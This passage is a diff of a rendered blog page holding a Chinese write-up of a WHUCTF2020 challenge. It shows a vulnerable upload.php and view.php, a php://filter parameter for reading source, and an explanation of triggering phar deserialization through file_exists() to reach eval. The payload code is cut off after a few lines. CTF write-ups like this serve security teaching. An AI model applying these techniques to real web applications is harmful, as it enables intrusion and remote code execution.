+</span><span class="s2">  if(!is_dir(</span><span class="si">$dir</span><span class="s2">)) {
+</span><span class="s2">    if(!mkdir(</span><span class="si">$dir</span><span class="s2">, 0777, true)) {
+</span><span class="s2">      echo error_get_last()[&#39;message&#39;];
+</span><span class="s2">      die(&#39;Failed to make the directory&#39;);
+</span><span class="s2">    }
+</span><span class="s2">  }
+</span><span class="s2">  chdir(</span><span class="si">$dir</span><span class="s2">);
+</span><span class="s2">  if(isset(</span><span class="si">$_POST[&#39;submit&#39;]</span><span class="s2">)) {
+</span><span class="s2">    </span><span class="si">$name</span><span class="s2"> = </span><span class="si">$_FILES[&#39;file&#39;]</span><span class="s2">[&#39;name&#39;];
+</span><span class="s2">    </span><span class="si">$tmp_name</span><span class="s2"> = </span><span class="si">$_FILES[&#39;file&#39;]</span><span class="s2">[&#39;tmp_name&#39;];
+</span><span class="s2">    </span><span class="si">$ans</span><span class="s2"> = exif_imagetype(</span><span class="si">$tmp_name</span><span class="s2">);
+</span><span class="s2">    if(</span><span class="si">$_FILES[&#39;file&#39;]</span><span class="s2">[&#39;size&#39;] &gt;= 204800) {
+</span><span class="s2">      die(&#39;filesize too big.&#39;);
+</span><span class="s2">    }
+</span><span class="s2">    if(!</span><span class="si">$name</span><span class="s2">) {
+</span><span class="s2">      die(&#39;filename can not be empty!&#39;);
+</span><span class="s2">    }
+</span><span class="s2">    if(preg_match(&#39;/(htaccess)|(user)|(\.\.)|(%)|(#)/i&#39;, </span><span class="si">$name</span><span class="s2">) !== 0) {
+</span><span class="s2">      die(&#39;Hacker!&#39;);
+</span><span class="s2">    }
+</span><span class="s2">    if((</span><span class="si">$ans</span><span class="s2"> != IMAGETYPE_GIF) &amp;&amp; (</span><span class="si">$ans</span><span class="s2"> != IMAGETYPE_JPEG) &amp;&amp; (</span><span class="si">$ans</span><span class="s2"> != IMAGETYPE_PNG)) {
+</span><span class="s2">      </span><span class="si">$type</span><span class="s2"> = </span><span class="si">$_FILES[&#39;file&#39;]</span><span class="s2">[&#39;type&#39;];
+</span><span class="s2">      if(</span><span class="si">$type</span><span class="s2"> == &#39;image/gif&#39; or </span><span class="si">$type</span><span class="s2"> == &#39;image/jpg&#39; or </span><span class="si">$type</span><span class="s2"> == &#39;image/png&#39; or </span><span class="si">$type</span><span class="s2"> == &#39;image/jpeg&#39;) {
+</span><span class="s2">        echo &#34;</span><span class="o">&lt;</span><span class="nx">p</span> <span class="nx">align</span><span class="o">=</span><span class="nx">\</span><span class="s2">&#34;center</span><span class="se">\&#34;</span><span class="s2">&gt;Don&#39;t cheat me with Content-Type!&lt;/p&gt;&#34;</span><span class="p">;</span>
       <span class="p">}</span>
       <span class="k">echo</span><span class="p">(</span><span class="s2">&#34;&lt;p align=</span><span class="se">\&#34;</span><span class="s2">center</span><span class="se">\&#34;</span><span class="s2">&gt;You can&#39;t upload this kind of file!&lt;/p&gt;&#34;</span><span class="p">);</span>
       <span class="k">exit</span><span class="p">;</span>
@@ -655,13 +655,13 @@ signature 签名，放在文件末尾；
     <span class="k">echo</span> <span class="s2">&#34;&lt;p align=</span><span class="se">\&#34;</span><span class="s2">center</span><span class="se">\&#34;</span><span class="s2">&gt;&lt;a href=</span><span class="se">\&#34;</span><span class="s2">view.php</span><span class="se">\&#34;</span><span class="s2"> &gt;点我去看上传的文件&lt;/a&gt;&lt;/p&gt;&#34;</span><span class="p">;</span>
     <span class="c1">#header(&#34;refresh:3;url=index.php&#34;);
 </span><span class="c1"></span>  <span class="p">}</span>
- <span class="cp">?&gt;</span>
-</code></pre></td></tr></table>
+ <span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
 </div>
 </div><p>读view.php：<code>?acti0n=PhP://Filter/convert.Base64-encode/resource=upload.php</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -749,16 +749,16 @@ signature 签名，放在文件末尾；
 </span><span class="lnt">86
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;!DOCTYPE html&gt;</span>
-<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;zh&#34;</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;Content-Type&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;text/html; charset=utf-8&#34;</span> <span class="p">/&gt;</span>
-  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>查看图片<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">link</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;text/css&#34;</span> <span class="na">rel </span><span class="o">=</span> <span class="s">&#34;stylesheet&#34;</span> <span class="na">href </span><span class="o">=</span> <span class="s">&#34;css/style.css&#34;</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">script</span> <span class="na">type </span><span class="o">=</span> <span class="s">&#34;text/javascript&#34;</span> <span class="na">color </span><span class="o">=</span> <span class="s">&#34;0,0,255&#34;</span> <span class="na">opacity </span><span class="o">=</span> <span class="s">&#39;0.7&#39;</span> <span class="na">zIndex </span><span class="o">=</span> <span class="s">&#34;-2&#34;</span> <span class="na">count </span><span class="o">=</span> <span class="s">&#34;99&#34;</span> <span class="na">src </span><span class="o">=</span> <span class="s">&#39;js/canvas-nest.min.js&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span> <span class="c">&lt;!-- 动态背景 --&gt;</span>
-  <span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;!</span><span class="nx">DOCTYPE</span> <span class="nx">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">html</span> <span class="nx">lang</span><span class="o">=</span><span class="s2">&#34;zh&#34;</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span> <span class="o">/&gt;</span>
+  <span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">查看图片</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">link</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&#34;text/css&#34;</span> <span class="nx">rel</span> <span class="o">=</span> <span class="s2">&#34;stylesheet&#34;</span> <span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;css/style.css&#34;</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="nx">body</span><span class="o">&gt;</span>
+  <span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span> <span class="o">=</span> <span class="s2">&#34;text/javascript&#34;</span> <span class="nx">color</span> <span class="o">=</span> <span class="s2">&#34;0,0,255&#34;</span> <span class="nx">opacity</span> <span class="o">=</span> <span class="s1">&#39;0.7&#39;</span> <span class="nx">zIndex</span> <span class="o">=</span> <span class="s2">&#34;-2&#34;</span> <span class="nx">count</span> <span class="o">=</span> <span class="s2">&#34;99&#34;</span> <span class="nx">src</span> <span class="o">=</span> <span class="s1">&#39;js/canvas-nest.min.js&#39;</span><span class="o">&gt;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span> <span class="o">&lt;!--</span> <span class="nx">动态背景</span> <span class="o">--&gt;</span>
+  <span class="o">&lt;?</span><span class="nx">php</span>
   <span class="c1">#include_once &#34;flag.php&#34;; 
 </span><span class="c1"></span>  <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
   <span class="k">class</span> <span class="nc">View</span>
@@ -832,17 +832,17 @@ signature 签名，放在文件末尾；
     <span class="nv">$ins</span><span class="o">-&gt;</span><span class="na">delete_img</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span>
   <span class="p">}</span>
   <span class="nx">unset</span><span class="p">(</span><span class="nv">$ins</span><span class="p">);</span>
-  <span class="cp">?&gt;</span>
-<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</code></pre></td></tr></table>
+  <span class="cp">?&gt;</span><span class="err">
+</span><span class="err">&lt;/body&gt;
+</span><span class="err">&lt;/html&gt;
+</span></code></pre></td></tr></table>
 </div>
 </div><p>在upload.php里可以看见白名单里有phar，明显就是让我们利用phar反序列化</p>
 <p>然后看到view.php里有明显的eval和file_exists()函数，于是可以利用view类的file_exists()出发phar反序列化然后调用eval执行我们的命令</p>
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -858,7 +858,7 @@ signature 签名，放在文件末尾；
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">class</span> <span class="nc">View</span>
     <span class="p">{</span>
         <span class="k">public</span> <span class="nv">$dir</span><span class="p">;</span>
@@ -893,7 +893,7 @@ signature 签名，放在文件末尾；
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://clq0.top/whuctf2020-writeup/" data-title="WHUCTF2020 Writeup" data-hashtags="Phar,SQL注入,LFI"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://clq0.top/whuctf2020-writeup/" data-hashtag="Phar"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://clq0.top/whuctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://clq0.top/whuctf2020-writeup/" data-title="WHUCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/whuctf2020-writeup/" data-title="WHUCTF2020 Writeup" data-via="Le0nsec" data-hashtags="Phar,SQL注入,LFI"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/whuctf2020-writeup/" data-hashtag="Phar"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/whuctf2020-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/whuctf2020-writeup/" data-title="WHUCTF2020 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
@@ -912,7 +912,7 @@ signature 签名，放在文件末尾；
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><a>本网站由</a><a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="-blank"><img src="/upyun_logo2.png" width="4%" style="vertical-align:middle"></a><a>提供CDN加速/云存储服务</a></div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://clq0.top" target="_blank">Leon</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
                     <span class="icp"><script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1278765080&web_id=1278765080"></script></span></div>
         </div>
     </footer></div>
